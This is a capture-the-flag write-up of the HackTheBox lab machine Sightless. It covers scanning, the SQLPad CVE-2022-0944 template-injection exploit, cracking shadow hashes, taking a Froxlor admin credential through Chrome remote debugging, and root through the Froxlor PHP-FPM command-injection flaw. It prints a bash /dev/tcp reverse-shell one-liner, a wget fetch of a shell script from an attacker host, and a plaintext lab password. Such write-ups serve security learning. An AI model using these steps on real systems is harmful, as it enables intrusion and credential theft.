---
title: Sightless - HackTheBox
authors: Samarth
date: 2024-12-01 16:30:00 +0530
categories: [HackTheBox Machines]
tags: [Linux, FTPd, Web, CVE-2022-0944,  ]
math: true
mermaid: true
---

![Cicada - HTB](/assets/images/writeups/Sightless-HTB/banner.png)

## TL;DR



## Scanning Network

I started with a Nmap scan and found ports 21, 22, and 80, corresponding to ProFTPD Server, OpenSSH and Nginx 1.18.0. Let's review the Nmap result.

```bash
nmap -sC -sV -A -T4 -Pn 10.10.11.32 -oN scan/normal.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2024-12-15 15:23 IST
Nmap scan report for 10.10.11.32
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94%I=7%D=12/15%Time=675EA730%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Se
SF:rver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20tr
SF:y\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20
SF:being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I have discovered two services: SSH and HTTP. Let's begin by enumerating the HTTP service. Allow us to delve into the enumeration phase.

## Enumeration

I have observed that in Nmap scan, IP address gives us a reference to a domain name `sightless.htb`. So, we have to add this domain to `"/etc/hosts"` file.

Let's open [__http://slightless.htb/__]().

![Browser View](/assets/images/writeups/Sightless-HTB/1.png)

Let's initiate directory fuzzing to discover any potentially interesting directories or parameters.

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://sightless.htb/FUZZ --hc 404,403
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sightless.htb/FUZZ
Total requests: 20116

=====================================================================
ID           Response   Lines    Word       Chars    Payload     
=====================================================================

000000002:   301        7 L      12 W       178 Ch   "images" 
000004255:   200        105 L    389 W      4993 Ch  "http://sightless.htb/"                                  
000006462:   301        7 L      12 W       178 Ch   "icones"  
```

I haven't found anything interesting while directory fuzzing. Let's browse the website and try to find some information.

While browsing the website, I have found one subdomain `sqlpad.sightless.htb`.

![Subdomain Browser View](/assets/images/writeups/Sightless-HTB/2.png)

Let's browse the SQLPad website and enumerate it to run SQL queries or find something interesting.

![SQLPad Version](/assets/images/writeups/Sightless-HTB/3.png)

I have found `SQLPad` version as `6.10.0`. Let's browse Google and try to find exploit for this SQLPad version if any exists.

SQLPad version 6.10.0 is vulnerable to [__CVE-2022-0944__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944). 

## Exploitation

`CVE-2022-0944` - Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.

Let's use this exploit to perform template injection in new SQLPad query. 

```bash
python3 exploit.py http://sqlpad.sightless.htb/ <Listener IP> <Listener Port>
```

The above exploit requires target, listener IP address and listener port. Before using the above exploit, let's open netcat listener on port 4444. Exploit will send the query to the server and server initiate new connection along with payload and then send back the shell to netcat listener.

```bash
python3 exploit.py http://sqlpad.sightless.htb/ 10.10.14.70 4444
Response status code: 400
Response body: {"title":"connect ECONNREFUSED 127.0.0.1:3306"}
Exploit sent, but server responded with status code: 400. Check your listener.
```

Once the exploit sent to the server, let's check netcat listener if the shell is received or not.

![Netcat Listener](/assets/images/writeups/Sightless-HTB/4.png)


It's surprising to see the direct root access to the system. But while browsing directories, I have found `.dockerenv` which confirms that the application is running in a docker container.

![Docker Container](/assets/images/writeups/Sightless-HTB/5.png)

While inspecting system's user, I got two usernames `michael` and `node`. It seems that the application is running under some user contexts, which could provide opportunity to carry further exploitation.

### User Flag

As now I have access to some user, let's check `/etc/passwd` and `/etc/shadow` files and will crack the hash using `unshadow`.

Accessing `/etc/passwd`

![/etc/passwd](/assets/images/writeups/Sightless-HTB/6.png)

Accessing `/etc/shadow`

![/etc/shadow](/assets/images/writeups/Sightless-HTB/7.png)

I will be using `unshadow` tool to combine content of `/etc/passwd` and `/etc/shadow`.

```bash
unshadow passwd shadow > passwd_shadow_combined
```

![unshadow](/assets/images/writeups/Sightless-HTB/8.png)

Let's use `john` to crack the hash and find the password.

![Root's and Michael's Password](/assets/images/writeups/Sightless-HTB/9.png)

It's interesting to see that using `john`, I have cracked password for `root` as well as `michael`. I'm pretty sure that the password of root itself indicates that it's not that easy. 

Let's utilise the username as `michael` and use the above password to login using SSH.

![Michael shell](/assets/images/writeups/Sightless-HTB/10.png)


### Root Flag (Post Exploitation)

I tried checking current user's privilege by running `sudo -l` but `michael` doesn't belongs to sudeors group.

Let's find SUID files execute with the permission of their owner.

```bash
find / -perm /4000 2>/dev/null
```

![Files with permission](/assets/images/writeups/Sightless-HTB/11.png)

I have tried to misconfigure executables to see if it's exploitable but no success. So, here I will be using Linpeas to find interesting files, directories, processes,etc.

While running Linpeas, I came across to VirtualHost which is using `127.0.0.1:8080` to run Froxlor service.

`Froxlor` is a lightweight, open-source web hosting control panel designed to manage hosting environments efficiently. It provides an intuitive graphical interface for users, resellers, and administrators to manage their web hosting accounts, domains, email, FTP, and more. Froxlor is often used as an alternative to popular control panels like cPanel and Plesk.

Let's find active TCP network connections, listening ports, and the corresponding process information using `telnet -tnlp`.

![netstat -tnlp](/assets/images/writeups/Sightless-HTB/12.png)

I have found `127.0.0.1:8080` might be used by Froxlor service. Let's do port forwarding into my machine's ip.

![Froxlor](/assets/images/writeups/Sightless-HTB/13.png)


While browsing for sometime and reviewing running processes in the system. I came across remote debugging port. I realised that Google Chrome Debugger can help me to debug the web application. Google Chrome Debugger is a tool that debug web application if the running Google Chrom debugger at specific port `--remote-debugging-port=<port>`.

![Remote Debugging Port](/assets/images/writeups/Sightless-HTB/14.png)

`remote-debugging-port=0`, it means that the remote debugging feature of Google Chrome (or any Chromium-based browser) will not have a fixed port. Instead, Chrome will dynamically assign an available port for remote debugging.

For identifying all the active TCP connections, I will use `netstat -tnlp`.

![Netstat -tnlp](/assets/images/writeups/Sightless-HTB/15.png)

There are so many ports active for TCP connections, I will be using each of the ports one by one to port forwarding until I receive connection on Chrome Debugger. Once the port forwarding is initiated, I will be using Google Chrome Debugger (`chrome://inspect/#devices`). 

I will be starting target discovery on Chrome Developer Toolfor that specific port which I have used during port forwarding to see if the connection is successful.

I will be starting with highest port `45553` to start port forwarding and same for chrome debugger.

```bash
ssh -L 45553:127.0.0.1:45553 michael@10.10.11.32
```

![Port Forwarding](/assets/images/writeups/Sightless-HTB/16.png)

Once the port forwarding is initiated, I will be `Inspect with Chrome Developer Tool` (`chrome://inspect/#devices`).

![Chrome Debugger Tool](/assets/images/writeups/Sightless-HTB/17.png)

Once I started the Chrome Debugger, I received the remote target access. While inspecting the web application. I have received the login credential for `Froxlor` service.

![Admin Credential](/assets/images/writeups/Sightless-HTB/18.png)

Let's utilise the credential and login as Admin to `Froxlor` login panel.

`admin:ForlorfroxAdmin`

![Froxlor Dashboard](/assets/images/writeups/Sightless-HTB/19.png)

Dashboard reveals the version of `Froxlor` that is `2.1.8`. While browsing, I came across towards `PHP-FPM`. Let's understand what `PHP-FPM` does.

FPM (FastCGI Process Manager) is a primary PHP FastCGI implementation containing some features (mostly) useful for heavy-loaded sites.

FPM requires `php-fpm restart command`, `configuration directory of php-fpm` and `process manager control`. Let's combine `Froxlor` version and `PHP-FPM` and search if any any vulnerability exist for this version.

I searched for `Froxlor RCE` and I have found this blog [__Disclosing Froxlor V2.x Authenticated RCE as Root Vulnerability via PHP-FPM__](https://sarperavci.com/Froxlor-Authenticated-RCE/).

The vulnerability allows to run arbitrary command in `php-fpm restart command` parameter. In the above blog, it is explained that there are couple of steps to follow to exploit the vulnerability.

1. `First` - Create a one liner reverse shell

```bash
bash -i >& /dev/tcp/<Attacker IP>/<Attacker Listener Port> 0>&1
```

2. `Second` - Transfer this shell to victim machine (`10.10.11.32`)

```bash
 wget http://<Attacker IP address>/shell.sh
 chmod +x shell.sh
 mv shell.sh /tmp
```
3. `Third` - Provide the following payload to `php-fpm restart command` parameter.

```bash
/bin/bash /tmp/shell.sh
```

![PHP-FPM restart command](/assets/images/writeups/Sightless-HTB/20.png)

Once you provided command, save the setting and start listener at attacker's machine.

After setting the custom `PHP-FPM restart command`, go to `System` -> `Settings` and click on `PHP-FPM`. After that, click on disable, wait for a few seconds, and click on enable. This will restart the PHP-FPM service and execute the reverse shell.

Let's wait for few minute and then check listener to see if I have got the root shell or not.

![Root Shell](/assets/images/writeups/Sightless-HTB/21.png)

![Machine Pwned](https://www.hackthebox.com/achievement/machine/337503/624)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t).











